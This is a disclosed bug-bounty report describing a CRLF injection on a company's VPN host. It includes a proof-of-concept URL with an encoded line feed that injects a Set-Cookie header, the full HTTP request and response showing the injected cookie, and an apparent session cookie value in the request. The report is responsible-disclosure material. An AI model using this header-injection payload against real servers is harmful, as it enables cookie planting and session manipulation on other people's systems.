# CRLF Injection on https://vpn.mixmax.com

## Report Details
- **Report ID**: 234758
- **URL**: https://hackerone.com/reports/234758
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-05-31T07:46:41.884Z
- **Disclosed**: 2017-06-06T18:23:38.540Z

## Reporter
- **Username**: sir_morty
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mixmax

## Vulnerability Information
Hey guys,

I found that the site https://vpn.mixmax.com is vulnerable to a CRLF Injection.

By injecting a  Carriage Return and Line Feed character, we are able to make the server issue a set-cookie header.


Proof-of-Concept:
==============

```
https://vpn.mixmax.com/__session_start__/%0aSet-Cookie:malicious_cookie1
````

Request:
-----------
```
GET /__session_start__/%0aSet-Cookie:malicious_cookie1 HTTP/1.1
Host: vpn.mixmax.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: openvpn_sess_e3c6c988cb5e4729bb261cf849082d71=9fbd7613d1b7f33d5717bcc33739caa1
Connection: close
```
Response:
------------
```
HTTP/1.1 302 Found
Date: Wed, 31 May 2017 07:38:50 GMT
Connection: close
Content-Type: text/html; charset=UTF-8
Location: https://vpn.mixmax.com/
Set-Cookie:malicious_cookie1
Server: OpenVPN-AS
Content-Length: 59


<html>
    <body>
    <p>REDIRECT</p>
    </body>
</html>
```
As can be seen in the response, the server will issue a Set-Cookie header with an arbitrary value and that cookie will be set on the client.

To mitigate this issue, the application should strip out any input which contains the %0d%0a URL encoded characters.

## Attachments
No attachments
